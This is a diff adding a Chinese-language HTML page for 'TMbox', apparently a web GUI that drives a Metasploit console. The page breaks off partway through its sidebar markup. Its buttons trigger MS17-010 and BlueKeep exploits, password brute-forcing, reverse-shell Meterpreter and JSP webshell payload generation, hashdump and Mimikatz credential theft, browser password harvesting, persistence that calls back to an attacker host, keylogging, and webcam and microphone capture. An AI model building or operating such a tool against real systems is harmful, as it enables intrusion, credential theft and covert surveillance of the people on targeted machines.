@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TMbox - MSF 图形化控制台</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { background-color: #0f172a; color: #e2e8f0; }
+        .terminal-font { font-family: 'Consolas', 'Courier New', monospace; }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #1e293b; }
+        ::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #64748b; }
+        .tab-active { background-color: #1e293b; border-bottom: 2px solid #ef4444; }
+        .panel-tab.active { background-color: #334155; color: #fff; }
+        .session-row:hover { background-color: #1e293b; }
+        .sidebar-collapsed { width: 0 !important; padding: 0 !important; overflow: hidden; }
+        .os-windows { color: #60a5fa; }
+        .os-linux { color: #fbbf24; }
+        .os-unknown { color: #94a3b8; }
+        .action-btn { transition: all 0.2s; }
+        .action-btn:hover { transform: scale(1.02); }
+        .sidebar-section { border-bottom: 1px solid #334155; }
+        .info-row { display: flex; justify-content: space-between; padding: 4px 0; }
+        .info-label { color: #64748b; font-size: 10px; }
+        .info-value { color: #e2e8f0; font-size: 10px; font-family: monospace; }
+    </style>
+</head>
+<body class="h-screen flex flex-col overflow-hidden">
+
+    <!-- 顶部导航 -->
+    <header class="bg-slate-900 border-b border-red-900/50 p-2 flex justify-between items-center shadow-lg z-10 shrink-0">
+        <div class="flex items-center gap-3">
+            <div class="w-3 h-3 rounded-full bg-red-500 animate-pulse"></div>
+            <h1 class="text-lg font-bold text-red-500 tracking-wider">MSF <span class="text-slate-400">CONSOLE</span></h1>
+            <span id="msfStatus" class="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-500">Connecting...</span>
+            <span id="sessionCount" class="text-[10px] px-2 py-0.5 rounded bg-green-900/50 text-green-400 hidden">0 Sessions</span>
+        </div>
+        <div class="flex gap-2 items-center">
+            <button onclick="toggleSidebar()" id="sidebarToggle" class="text-xs bg-purple-900/50 hover:bg-purple-800 text-purple-300 px-3 py-1.5 rounded border border-purple-900/50 transition">
+                会话面板
+            </button>
+            <button onclick="window.location.href='/'" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded border border-slate-700 transition">
+                ← 返回主页
+            </button>
+            <button onclick="killSession()" class="text-xs bg-red-900/50 hover:bg-red-800 text-red-400 px-3 py-1.5 rounded border border-red-900/50 transition">
+                重置会话
+            </button>
+        </div>
+    </header>
+
+    <!-- 主体内容 -->
+    <div class="flex flex-1 overflow-hidden">
+
+        <!-- 左侧：功能面板 -->
+        <div class="w-72 bg-slate-800 border-r border-slate-700 flex flex-col overflow-hidden shrink-0">
+
+            <!-- 面板标签页 -->
+            <div class="flex bg-slate-900 border-b border-slate-700 text-[10px]">
+                <button onclick="switchPanel('modules')" id="tab-modules" class="panel-tab active flex-1 py-2 font-medium text-slate-400 hover:text-white transition">模块</button>
+                <button onclick="switchPanel('payloads')" id="tab-payloads" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">Payload</button>
+                <button onclick="switchPanel('downloads')" id="tab-downloads" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">文件</button>
+                <button onclick="switchPanel('listeners')" id="tab-listeners" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">监听</button>
+                <button onclick="switchPanel('quickcmd')" id="tab-quickcmd" class="panel-tab flex-1 py-2 font-medium text-slate-400 hover:text-white transition">快捷</button>
+            </div>
+
+            <!-- 模块面板 -->
+            <div id="panel-modules" class="panel-content flex-1 overflow-y-auto">
+                <div class="p-2">
+                    <label class="block text-[10px] text-slate-400 mb-1">选择模块</label>
+                    <select id="moduleSelect" onchange="loadModuleConfig()" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
+                        <optgroup label="🔥 热门漏洞利用">
+                            <option value="ms17_010">MS17-010 永恒之蓝 (SMB)</option>
+                            <option value="bluekeep">CVE-2019-0708 BlueKeep (RDP)</option>
+                            <option value="netapi">MS08-067 NetAPI (老系统)</option>
+                            <option value="psexec">PsExec 横向移动</option>
+                        </optgroup>
+                        <optgroup label="🔍 扫描与探测">
+                            <option value="smb_version">SMB 版本探测</option>
+                            <option value="smb_login">SMB 弱口令爆破</option>
+                            <option value="portscan">TCP 端口扫描</option>
+                            <option value="ssh_login">SSH 弱口令爆破</option>
+                        </optgroup>
+                        <optgroup label="📥 监听器">
+                            <option value="handler">Multi Handler (通用)</option>
+                        </optgroup>
+                    </select>
+                    <p id="moduleDesc" class="text-[9px] text-slate-500 mt-1 p-1.5 bg-slate-900/50 rounded">利用 Windows SMB 协议漏洞远程执行代码</p>
+                </div>
+
+                <div class="p-2 border-t border-slate-700">
+                    <h3 class="text-[10px] font-bold text-yellow-500 mb-2">参数配置</h3>
+                    <div class="space-y-1.5">
+                        <div>
+                            <label class="block text-[9px] text-slate-400 mb-0.5">目标 RHOSTS</label>
+                            <input type="text" id="rhosts" placeholder="192.168.1.100" class="w-full bg-slate-900 text-green-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
+                        </div>
+                        <div class="grid grid-cols-2 gap-1.5">
+                            <div>
+                                <label class="block text-[9px] text-slate-400 mb-0.5">LHOST</label>
+                                <input type="text" id="lhost" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-[9px] text-slate-400 mb-0.5">LPORT</label>
+                                <input type="text" id="lport" value="4444" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
+                            </div>
+                        </div>
+                        <div id="payloadGroup">
+                            <label class="block text-[9px] text-slate-400 mb-0.5">Payload</label>
+                            <select id="payload" class="w-full bg-slate-900 text-slate-300 border border-slate-600 rounded p-1.5 text-xs outline-none">
+                                <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
+                                <option value="windows/x64/meterpreter/reverse_https">Windows x64 HTTPS</option>
+                                <option value="windows/meterpreter/reverse_tcp">Windows x86 Meterpreter</option>
+                                <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="p-2 border-t border-slate-700">
+                    <button onclick="runModule()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-3 rounded text-xs">⚡ 执行模块</button>
+                </div>
+            </div>
+
+            <!-- Payload 生成面板 -->
+            <div id="panel-payloads" class="panel-content flex-1 overflow-y-auto hidden">
+                <div class="p-2">
+                    <h3 class="text-[10px] font-bold text-green-400 mb-2">快速生成 Payload</h3>
+                    <div class="space-y-1.5 mb-3">
+                        <div>
+                            <label class="block text-[9px] text-slate-400 mb-0.5">Payload 类型</label>
+                            <select id="genPayload" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
+                                <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
+                                <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter</option>
+                                <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
+                                <option value="java/jsp_shell_reverse_tcp">JSP Webshell</option>
+                            </select>
+                        </div>
+                        <div class="grid grid-cols-2 gap-1.5">
+                            <div>
+                                <label class="block text-[9px] text-slate-400 mb-0.5">LHOST</label>
+                                <input type="text" id="genLhost" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-[9px] text-slate-400 mb-0.5">格式</label>
+                                <select id="genFormat" class="w-full bg-slate-900 text-slate-200 text-xs border border-slate-600 rounded p-1.5 outline-none">
+                                    <option value="exe">exe</option>
+                                    <option value="elf">elf</option>
+                                    <option value="php">php</option>
+                                    <option value="jsp">jsp</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                    <button onclick="generatePayload()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-1.5 px-3 rounded text-xs">🛠️ 生成</button>
+
+                    <div class="mt-3">
+                        <h4 class="text-[9px] font-bold text-slate-400 mb-1">快速生成</h4>
+                        <div class="space-y-1">
+                            <button onclick="quickGeneratePayload('windows', 'exe')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Windows .exe</button>
+                            <button onclick="quickGeneratePayload('linux', 'elf')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Linux .elf</button>
+                            <button onclick="quickGeneratePayload('php', 'php')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">PHP .php</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 文件下载面板 -->
+            <div id="panel-downloads" class="panel-content flex-1 overflow-y-auto hidden">
+                <div class="p-2">
+                    <div class="flex justify-between items-center mb-2">
+                        <h3 class="text-[10px] font-bold text-cyan-400">Payload 文件</h3>
+                        <button onclick="refreshPayloadFiles()" class="text-[9px] bg-slate-700 hover:bg-slate-600 text-slate-300 px-2 py-0.5 rounded">刷新</button>
+                    </div>
+                    <div id="payloadFilesList" class="space-y-1 max-h-48 overflow-y-auto">
+                        <div class="text-center text-slate-600 text-[10px] py-3">点击刷新...</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 监听器面板 -->
+            <div id="panel-listeners" class="panel-content flex-1 overflow-y-auto hidden">
+                <div class="p-2">
+                    <h3 class="text-[10px] font-bold text-blue-400 mb-2">快速监听器</h3>
+                    <div class="space-y-1.5 mb-3">
+                        <div class="grid grid-cols-2 gap-1.5">
+                            <div>
+                                <label class="block text-[9px] text-slate-400 mb-0.5">LHOST</label>
+                                <input type="text" id="handlerLhost" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
+                            </div>
+                            <div>
+                                <label class="block text-[9px] text-slate-400 mb-0.5">LPORT</label>
+                                <input type="text" id="handlerLport" value="4444" class="w-full bg-slate-900 text-blue-400 border border-slate-600 rounded p-1.5 text-xs outline-none">
+                            </div>
+                        </div>
+                    </div>
+                    <button onclick="startHandler()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-1.5 px-3 rounded text-xs mb-2">启动监听</button>
+
+                    <div class="mt-2">
+                        <h4 class="text-[9px] font-bold text-slate-400 mb-1">预设监听</h4>
+                        <div class="space-y-1">
+                            <button onclick="presetHandler(4444, 'windows/x64/meterpreter/reverse_tcp')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300 flex justify-between">
+                                <span>Windows (4444)</span><span class="text-blue-400">TCP</span>
+                            </button>
+                            <button onclick="presetHandler(5555, 'linux/x64/meterpreter/reverse_tcp')" class="w-full text-left text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300 flex justify-between">
+                                <span>Linux (5555)</span><span class="text-yellow-400">TCP</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 快捷命令面板 -->
+            <div id="panel-quickcmd" class="panel-content flex-1 overflow-y-auto hidden">
+                <div class="p-2 space-y-2">
+                    <!-- 核心命令 -->
+                    <div>
+                        <h4 class="text-[9px] text-yellow-400 mb-1 font-bold">⚡ 核心命令</h4>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickCmd('help')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">帮助</button>
+                            <button onclick="quickCmd('version')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">版本</button>
+                            <button onclick="quickCmd('banner')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">横幅</button>
+                            <button onclick="quickCmd('connect')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">连接主机</button>
+                        </div>
+                    </div>
+
+                    <!-- 模块命令 -->
+                    <div>
+                        <h4 class="text-[9px] text-blue-400 mb-1 font-bold">📦 模块命令</h4>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickCmd('show all')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">显示全部</button>
+                            <button onclick="quickCmd('show exploits')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">漏洞利用</button>
+                            <button onclick="quickCmd('show payloads')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">载荷列表</button>
+                            <button onclick="quickCmd('show auxiliary')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">辅助模块</button>
+                            <button onclick="quickCmd('show post')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">后渗透</button>
+                            <button onclick="quickCmd('show encoders')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">编码器</button>
+                            <button onclick="quickCmd('show nops')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">空指令</button>
+                            <button onclick="quickCmd('search ')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">搜索模块</button>
+                            <button onclick="quickCmd('info')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">模块信息</button>
+                            <button onclick="quickCmd('back')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">返回上级</button>
+                        </div>
+                    </div>
+
+                    <!-- 任务/会话管理 -->
+                    <div>
+                        <h4 class="text-[9px] text-green-400 mb-1 font-bold">📋 任务与会话</h4>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickCmd('sessions -l')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">会话列表</button>
+                            <button onclick="quickCmd('sessions -K')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">关闭所有会话</button>
+                            <button onclick="quickCmd('jobs')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">任务列表</button>
+                            <button onclick="quickCmd('jobs -K')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">关闭所有任务</button>
+                        </div>
+                    </div>
+
+                    <!-- 数据库命令 -->
+                    <div>
+                        <h4 class="text-[9px] text-cyan-400 mb-1 font-bold">💾 数据库</h4>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickCmd('db_status')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">数据库状态</button>
+                            <button onclick="quickCmd('db_connect')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">连接数据库</button>
+                            <button onclick="quickCmd('hosts')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">主机列表</button>
+                            <button onclick="quickCmd('services')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">服务列表</button>
+                            <button onclick="quickCmd('vulns')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">漏洞列表</button>
+                            <button onclick="quickCmd('creds')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">凭证列表</button>
+                            <button onclick="quickCmd('loot')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">战利品</button>
+                        </div>
+                    </div>
+
+                    <!-- Meterpreter 快捷 -->
+                    <div>
+                        <h4 class="text-[9px] text-red-400 mb-1 font-bold">🎯 Meterpreter</h4>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickCmd('use exploit/multi/handler')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">监听器</button>
+                            <button onclick="quickCmd('msfvenom -l payloads')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">载荷列表</button>
+                        </div>
+                    </div>
+
+                    <!-- 资源脚本 -->
+                    <div>
+                        <h4 class="text-[9px] text-purple-400 mb-1 font-bold">📜 资源脚本</h4>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickCmd('resource ')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">运行脚本</button>
+                            <button onclick="quickCmd('makerc ')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">保存历史</button>
+                        </div>
+                    </div>
+
+                    <!-- 系统工具 -->
+                    <div>
+                        <h4 class="text-[9px] text-orange-400 mb-1 font-bold">🛠️ 系统工具</h4>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="quickCmd('irb')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Ruby终端</button>
+                            <button onclick="quickCmd(' pry')" class="text-[9px] bg-slate-900 hover:bg-slate-700 p-1.5 rounded text-slate-300">Pry调试</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 中间：终端和会话管理 -->
+        <div class="flex-1 flex flex-col bg-black min-w-0">
+
+            <!-- 上半部分：会话/任务管理 -->
+            <div class="h-36 bg-slate-900 border-b border-slate-700 flex flex-col shrink-0">
+                <div class="flex items-center px-3 py-1 border-b border-slate-800 bg-slate-800/50">
+                    <div class="flex gap-3">
+                        <button onclick="showTab('sessions')" id="btn-sessions" class="text-[10px] font-bold text-white border-b-2 border-red-500 pb-0.5">会话</button>
+                        <button onclick="showTab('jobs')" id="btn-jobs" class="text-[10px] font-bold text-slate-400 hover:text-white pb-0.5">任务</button>
+                    </div>
+                    <div class="flex-1"></div>
+                    <button onclick="refreshSessions()" class="text-[9px] bg-blue-600 hover:bg-blue-500 text-white px-2 py-0.5 rounded">刷新</button>
+                </div>
+
+                <!-- 会话列表 -->
+                <div id="tab-sessions" class="flex-1 overflow-y-auto">
+                    <table class="w-full text-left border-collapse text-[10px]">
+                        <thead class="bg-slate-800 sticky top-0">
+                            <tr class="text-slate-500">
+                                <th class="p-1.5 font-normal w-8">ID</th>
+                                <th class="p-1.5 font-normal w-16">类型</th>
+                                <th class="p-1.5 font-normal">目标</th>
+                                <th class="p-1.5 font-normal w-14">系统</th>
+                                <th class="p-1.5 font-normal w-16">操作</th>
+                            </tr>
+                        </thead>
+                        <tbody id="sessionsList" class="text-slate-300">
+                            <tr><td colspan="5" class="p-2 text-center text-slate-600">暂无会话</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- 任务列表 -->
+                <div id="tab-jobs" class="flex-1 overflow-y-auto hidden">
+                    <table class="w-full text-left border-collapse text-[10px]">
+                        <thead class="bg-slate-800 sticky top-0">
+                            <tr class="text-slate-500">
+                                <th class="p-1.5 font-normal w-8">ID</th>
+                                <th class="p-1.5 font-normal">模块</th>
+                                <th class="p-1.5 font-normal w-12">操作</th>
+                            </tr>
+                        </thead>
+                        <tbody id="jobsList" class="text-slate-300">
+                            <tr><td colspan="3" class="p-2 text-center text-slate-600">暂无任务</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- 下半部分：终端 -->
+            <div class="flex-1 flex flex-col min-h-0">
+                <div id="terminal-container" class="flex-1 overflow-y-auto p-2 terminal-font text-xs text-slate-300 leading-relaxed bg-black"
+                     onclick="document.getElementById('cmdInput').focus()">
+                    <div id="output" class="whitespace-pre-wrap pb-8"></div>
+                </div>
+
+                <!-- 命令输入 -->
+                <div class="p-1.5 bg-slate-900 border-t border-slate-800 flex items-center gap-2">
+                    <span class="text-red-500 font-bold text-xs">msf6 ></span>
+                    <input type="text" id="cmdInput"
+                           class="bg-transparent border-none outline-none flex-1 text-slate-200 text-xs placeholder-slate-600 font-mono"
+                           placeholder="输入命令..." autocomplete="off">
+                    <button onclick="sendCommand()" class="text-[10px] bg-red-600 hover:bg-red-700 text-white px-2 py-1 rounded">发送</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 右侧：会话操作侧边栏 -->
+        <div id="sessionSidebar" class="w-72 bg-slate-800 border-l border-slate-700 flex flex-col overflow-hidden shrink-0 transition-all duration-300 sidebar-collapsed">
+
+            <!-- 侧边栏头部 -->
+            <div class="bg-slate-900 border-b border-slate-700 p-2 flex justify-between items-center">
+                <div class="flex items-center gap-2">
+                    <div id="sidebarOsIcon" class="text-lg">💻</div>
+                    <div>
+                        <div id="sidebarTitle" class="text-xs font-bold text-slate-200">会话控制台</div>
+                        <div id="sidebarSubtitle" class="text-[9px] text-slate-500">选择一个会话</div>
+                    </div>
+                </div>
+                <button onclick="toggleSidebar()" class="text-slate-500 hover:text-white text-xs">✕</button>
+            </div>
+
+            <!-- 会话信息 -->
+            <div id="sessionInfo" class="p-2 border-b border-slate-700 hidden">
+                <h3 class="text-[10px] font-bold text-cyan-400 mb-2">📊 系统信息</h3>
+                <div id="sysInfoContent" class="space-y-1 text-[9px]">
+                    <!-- 动态填充 -->
+                </div>
+                <button onclick="refreshSysInfo()" class="w-full mt-2 text-[9px] bg-slate-700 hover:bg-slate-600 text-slate-300 py-1 rounded">刷新信息</button>
+            </div>
+
+            <!-- 快捷操作 -->
+            <div id="quickActions" class="flex-1 overflow-y-auto">
+                <!-- 无会话提示 -->
+                <div id="noSessionHint" class="p-4 text-center text-slate-600 text-[10px]">
+                    <div class="text-2xl mb-2">🔗</div>
+                    <p>请从会话列表中选择一个会话</p>
+                    <p class="text-slate-700 mt-1">或建立新连接</p>
+                </div>
+
+                <!-- Windows 操作 -->
+                <div id="windowsActions" class="hidden">
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-blue-400 mb-2">🪟 基础信息</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('sysinfo')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">系统信息</button>
+                            <button onclick="sessionCmd('getuid')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">当前用户</button>
+                            <button onclick="sessionCmd('getpid')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">进程ID</button>
+                            <button onclick="sessionCmd('ps')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">进程列表</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2">⚡ 权限提升</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('getsystem', true)" class="action-btn text-[9px] bg-yellow-900/50 hover:bg-yellow-800 p-1.5 rounded text-yellow-300">GetSystem</button>
+                            <button onclick="sessionCmd('run post/multi/recon/local_exploit_suggester', true)" class="action-btn text-[9px] bg-yellow-900/50 hover:bg-yellow-800 p-1.5 rounded text-yellow-300">提权建议</button>
+                            <button onclick="sessionCmd('run post/windows/gather/enum_patches', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">补丁信息</button>
+                            <button onclick="sessionCmd('run post/windows/gather/enum_services', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">服务列表</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-red-400 mb-2">🔐 凭证收集</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('run post/windows/gather/smart_hashdump', true)" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">HashDump</button>
+                            <button onclick="sessionCmd('run post/windows/gather/credentials/gpp', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">GPP密码</button>
+                            <button onclick="sessionCmd('load kiwi', true)" class="action-btn text-[9px] bg-red-900/50 hover:bg-red-800 p-1.5 rounded text-red-300">Mimikatz</button>
+                            <button onclick="sessionCmd('run post/windows/gather/enum_chrome', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Chrome</button>
+                            <button onclick="sessionCmd('run post/windows/gather/enum_firefox', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">Firefox</button>
+                            <button onclick="sessionCmd('run post/windows/gather/enum_terms', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">终端凭证</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-green-400 mb-2">🔧 权限维持</h3>
+                        <div class="grid grid-cols-1 gap-1">
+                            <button onclick="sessionCmd('run persistence -U -i 10 -p 4445 -r ' + (document.getElementById('lhost')?.value || '0.0.0.0'), true)" class="action-btn text-[9px] bg-green-900/50 hover:bg-green-800 p-1.5 rounded text-green-300 text-left">Persistence</button>
+                            <button onclick="sessionCmd('run post/windows/manage/persistence', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">持久化模块</button>
+                            <button onclick="sessionCmd('run post/windows/manage/install_msi', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">MSI 后门</button>
+                            <button onclick="sessionCmd('run scheduleme', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded text-left">计划任务</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-purple-400 mb-2">🌐 横向移动</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('run autoroute', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">自动路由</button>
+                            <button onclick="sessionCmd('run post/multi/gather/ping_sweep', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">网段探测</button>
+                            <button onclick="sessionCmd('run post/windows/gather/enum_ad_users', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">域用户</button>
+                            <button onclick="sessionCmd('run post/windows/gather/enum_ad_computers', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">域计算机</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-cyan-400 mb-2">📁 文件操作</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('pwd')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">当前目录</button>
+                            <button onclick="sessionCmd('ls')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">文件列表</button>
+                            <button onclick="sessionCmd('cd ..')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">上级目录</button>
+                            <button onclick="sessionCmd('download ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">下载文件</button>
+                            <button onclick="sessionCmd('upload ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">上传文件</button>
+                            <button onclick="sessionCmd('edit ', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">编辑文件</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-pink-400 mb-2">👀 监控功能</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('screenshot')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">截屏</button>
+                            <button onclick="sessionCmd('keyscan_start', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">键盘记录</button>
+                            <button onclick="sessionCmd('keyscan_dump', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">导出记录</button>
+                            <button onclick="sessionCmd('webcam_list', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">摄像头</button>
+                            <button onclick="sessionCmd('record_mic', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">录音</button>
+                            <button onclick="sessionCmd('enumdesktops', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">桌面列表</button>
+                        </div>
+                    </div>
+
+                    <div class="sidebar-section p-2">
+                        <h3 class="text-[10px] font-bold text-orange-400 mb-2">🔌 网络工具</h3>
+                        <div class="grid grid-cols-2 gap-1">
+                            <button onclick="sessionCmd('ipconfig')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">网络配置</button>
+                            <button onclick="sessionCmd('netstat')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">网络连接</button>
+                            <button onclick="sessionCmd('route')" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">路由表</button>
+                            <button onclick="sessionCmd('arp', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">ARP表</button>
+                            <button onclick="sessionCmd('portfwd add -l 3389 -p 3389 -r 127.0.0.1', true)" class="action-btn text-[9px] bg-slate-700 hover:bg-slate-600 p-1.5 rounded">端口转发</button>
